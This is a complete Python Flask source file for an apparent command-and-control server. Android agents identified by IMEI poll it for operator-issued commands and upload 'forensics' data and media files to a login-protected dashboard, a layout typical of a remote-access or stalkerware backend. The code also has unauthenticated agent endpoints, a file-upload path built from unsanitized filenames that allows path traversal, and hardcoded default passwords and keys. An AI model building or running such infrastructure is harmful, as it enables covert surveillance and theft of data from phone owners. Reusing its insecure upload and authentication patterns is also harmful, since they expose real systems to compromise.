import os
import sqlite3
from flask import Flask, render_template, request, redirect, url_for, session, jsonify

app = Flask(__name__)
app.secret_key = os.environ.get("FLASK_SECRET_KEY", "breadcrumb_secure_fallback_key")

DB_PATH = "breadcrumb.db"

def init_db():
    """Initializes the SQLite database with WAL mode for high concurrency support."""
    conn = sqlite3.connect(DB_PATH)
    # Enable WAL mode to prevent database locking during concurrent agent uploads/polls
    conn.execute("PRAGMA journal_mode=WAL;")
    c = conn.cursor()
    
    c.execute('''CREATE TABLE IF NOT EXISTS devices (
                    imei TEXT PRIMARY KEY,
                    make_model TEXT,
                    status TEXT,
                    last_seen DATETIME
                )''')
                
    c.execute('''CREATE TABLE IF NOT EXISTS commands (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    imei TEXT,
                    command TEXT,
                    status TEXT
                )''')
                
    c.execute('''CREATE TABLE IF NOT EXISTS forensics (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    imei TEXT,
                    data_type TEXT,
                    content TEXT,
                    timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
                )''')
                
    c.execute('''CREATE TABLE IF NOT EXISTS media (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    imei TEXT,
                    filename TEXT,
                    filepath TEXT,
                    timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
                )''')
    conn.commit()
    conn.close()

# Initialize database on startup
init_db()

def get_db_connection():
    """Creates a database connection with an increased timeout to avoid locking stalls."""
    conn = sqlite3.connect(DB_PATH, timeout=15.0)
    conn.row_factory = sqlite3.Row
    return conn

@app.route('/')
def index():
    if not session.get('logged_in'):
        return redirect(url_for('login'))
    
    conn = get_db_connection()
    devices = conn.execute("SELECT * FROM devices ORDER BY last_seen DESC").fetchall()
    conn.close()
    return render_template("dashboard.html", devices=devices)

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        if request.form.get('password') == os.environ.get("ADMIN_PASSWORD", "breadcrumb2026"):
            session['logged_in'] = True
            return redirect(url_for('index'))
        return render_template("login.html", error="Invalid Password")
    return render_template("login.html")

@app.route('/logout')
def logout():
    session.clear()
    return redirect(url_for('login'))

@app.route('/device/<imei>')
def admin_dashboard(imei):
    if not session.get('logged_in'):
        return redirect(url_for('login'))
        
    conn = get_db_connection()
    device = conn.execute("SELECT * FROM devices WHERE imei = ?", (imei,)).fetchone()
    forensics = conn.execute("SELECT * FROM forensics WHERE imei = ? ORDER BY timestamp DESC LIMIT 50", (imei,)).fetchall()
    media = conn.execute("SELECT * FROM media WHERE imei = ? ORDER BY timestamp DESC LIMIT 20", (imei,)).fetchall()
    conn.close()
    
    if not device:
        return "Device not found", 404
        
    return render_template("device_detail.html", device=device, forensics=forensics, media=media)

@app.route('/api/sync', methods=['POST'])
def api_sync():
    data = request.json
    if not data or 'imei' not in data:
        return jsonify({"error": "Missing IMEI"}), 400
        
    imei = data['imei']
    make_model = data.get('make_model', 'Android Agent')
    status = data.get('status', 'Online')

    try:
        conn = get_db_connection()
        c = conn.cursor()
        c.execute("""
            INSERT INTO devices (imei, make_model, status, last_seen) 
            VALUES (?, ?, ?, CURRENT_TIMESTAMP) 
            ON CONFLICT(imei) DO UPDATE SET make_model=?, status=?, last_seen=CURRENT_TIMESTAMP
        """, (imei, make_model, status, make_model, status))
        conn.commit()
    except Exception as e:
        return jsonify({"error": str(e)}), 500
    finally:
        conn.close()
        
    return jsonify({"status": "success"})

@app.route('/api/poll-commands', methods=['GET'])
def api_poll_commands():
    imei = request.args.get('imei')
    if not imei:
        return jsonify([])
        
    try:
        conn = get_db_connection()
        c = conn.cursor()
        c.execute("SELECT id, command FROM commands WHERE imei = ? AND status = 'PENDING'", (imei,))
        rows = c.fetchall()

        cmds = []
        for r in rows:
            cmds.append({"id": r['id'], "command": r['command']})
            c.execute("UPDATE commands SET status = 'EXECUTED' WHERE id = ?", (r['id'],))

        conn.commit()
    except Exception as e:
        return jsonify({"error": str(e)}), 500
    finally:
        conn.close()
        
    return jsonify(cmds)

@app.route('/api/upload-forensics', methods=['POST'])
def api_upload_forensics():
    data = request.json
    if not data or 'imei' not in data or 'data_type' not in data:
        return jsonify({"error": "Invalid payload"}), 400
        
    try:
        conn = get_db_connection()
        c = conn.cursor()
        c.execute("""
            INSERT INTO forensics (imei, data_type, content) 
            VALUES (?, ?, ?)
        """, (data['imei'], data['data_type'], str(data['content'])))
        conn.commit()
    except Exception as e:
        return jsonify({"error": str(e)}), 500
    finally:
        conn.close()
        
    return jsonify({"status": "success"})

@app.route('/api/upload-media', methods=['POST'])
def api_upload_media():
    imei = request.form.get('imei')
    file = request.files.get('file')
    if not imei or not file:
        return jsonify({"error": "Missing IMEI or file"}), 400
        
    upload_folder = os.path.join("static", "uploads")
    os.makedirs(upload_folder, exist_ok=True)

    filepath = os.path.join(upload_folder, file.filename)
    file.save(filepath)

    try:
        conn = get_db_connection()
        c = conn.cursor()
        c.execute("""
            INSERT INTO media (imei, filename, filepath) 
            VALUES (?, ?, ?)
        """, (imei, file.filename, f"/{filepath}"))
        conn.commit()
    except Exception as e:
        return jsonify({"error": str(e)}), 500
    finally:
        conn.close()
        
    return jsonify({"status": "success"})

@app.route('/dispatch/<imei>', methods=['POST'])
def dispatch_command(imei):
    if not session.get('logged_in'):
        return redirect(url_for('login'))
        
    cmd = request.form.get('cmd')
    if cmd:
        try:
            conn = get_db_connection()
            c = conn.cursor()
            c.execute("""
                INSERT INTO commands (imei, command, status) 
                VALUES (?, ?, 'PENDING')
            """, (imei, cmd))
            conn.commit()
        finally:
            conn.close()
            
    return redirect(url_for('admin_dashboard', imei=imei))

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=int(os.environ.get("PORT", 10000)))
